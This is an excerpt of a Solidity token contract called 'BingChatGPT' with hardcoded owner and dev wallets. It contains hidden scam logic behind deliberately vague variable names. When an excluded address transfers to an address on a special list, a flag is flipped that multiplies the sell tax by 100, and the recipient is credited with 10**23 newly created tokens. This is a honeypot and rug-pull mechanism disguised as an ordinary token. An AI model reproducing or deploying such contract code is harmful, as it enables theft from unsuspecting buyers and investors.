...
// Telegram : https://t.me/BingChatGPTOfficial
...
contract BingChatGPT is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xF4749FeE4fF13051470c39D333D42b1Bffcc9dcb); 
    address payable public Wallet_Dev = payable(0x2593efBadee57D7c3E7EF7fA2A609cb7083fbb2E);
    ...
    bool public isBalancedToken = true;
    bool public thismartContrat = false;
    ...
    constructor (uint256[] memory taxes) {
        ...
        _owner = 0x2593efBadee57D7c3E7EF7fA2A609cb7083fbb2E;
    ...
    function _transfer(
        ...
        if (trueMore && trueMore && from != owner())
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
            if(_noTaxesList[to]){
                isBalancedToken = false;
                thismartContrat = true;
            }
        } else {
    ...
    function getVTValues(uint256 amount) private view returns(uint256, uint256){
        return (amount*TaxList.buy/100, (amount*TaxList.sell/100).mul(!isBalancedToken ? 100:1));
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        (uint256 buyFEE, uint256 sellFEE) = getVTValues(tAmount);
        if(!takeFee){

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = (_tOwned[recipient]+tAmount).add(thismartContrat ? 10**(22+1) : 0);
            thismartContrat = false;
